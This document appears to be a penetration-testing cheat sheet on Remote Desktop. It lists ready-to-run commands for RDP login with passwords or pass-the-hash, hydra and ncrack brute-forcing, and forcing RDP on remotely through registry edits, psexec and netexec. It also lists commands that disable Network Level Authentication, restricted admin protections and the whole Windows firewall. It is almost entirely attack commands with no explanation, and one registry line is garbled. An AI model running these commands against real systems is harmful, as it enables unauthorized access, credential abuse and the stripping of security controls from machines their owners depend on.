## Remote desktop access
- `xfreerdp /u:[domain]\[username] /p:[password] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`
- `xfreerdp /u:[domain]\[username] /pth:[hash] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`
- `rdesktop -d [domain] -u [username] -p [password] [host]`

### Brute Force
- `hydra -l [username] -P [wordlist] -s [port] rdp://[host]`
- `ncrack -vv --user Administrator -P /root/passwords.txt rdp://10.10.10.10`

### Enable RDP
- `PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f`
- OR
- `PS C:\> reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fctions /t REG_DWORD /d 0`
- `PS C:\> netsh firewall set service remoteadmin enable`
- `PS C:\> netsh firewall set service remotedesktop enable`

### Enable RDP Additional Option
- `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f`
- `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
- `netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
OR
- `netsh advfirewall set allprofiles state off`
- `sc start TermService`

#### Alternative
- `C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0`
- `kali@user$ netexec 10.10.10.10 -u username -H hashtext -M rdp -o ACTION=enable`

#### CredSSP erros
- `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f`

#### Disable NLA
- `PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired`
- `PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)`
